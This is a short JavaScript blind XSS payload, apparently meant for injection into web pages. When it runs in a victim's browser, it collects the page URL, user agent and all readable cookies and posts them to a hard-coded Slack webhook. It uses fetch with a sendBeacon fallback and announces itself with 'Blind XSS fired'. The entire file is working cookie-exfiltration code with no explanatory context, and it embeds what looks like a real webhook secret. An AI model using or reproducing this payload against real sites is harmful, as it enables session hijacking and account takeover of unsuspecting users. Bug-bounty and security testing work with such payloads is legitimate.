(function () {
  const cap = (s, n) => (s || '').toString().slice(0, n);
  const msg = [
    'Blind XSS fired',
    'URL: ' + cap(location.href, 1800),
    'UA: ' + cap(navigator.userAgent, 1800),
    'Cookies: ' + cap(document.cookie || 'NA', 1800),
    'Time: ' + new Date().toISOString()
  ].join(' | ');

  const SLACK_WEBHOOK = 'https://hooks.slack.com/services/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';

  // Try a simple fetch first (no custom headers to reduce preflight).
  try {
    fetch(SLACK_WEBHOOK, { method: 'POST', body: JSON.stringify({ text: msg }) });
  } catch (e) {}

  // Fallback: sendBeacon (opaque, but often succeeds in sending the body).
  try {
    navigator.sendBeacon && navigator.sendBeacon(SLACK_WEBHOOK, JSON.stringify({ text: msg }));
  } catch (e) {}
})();
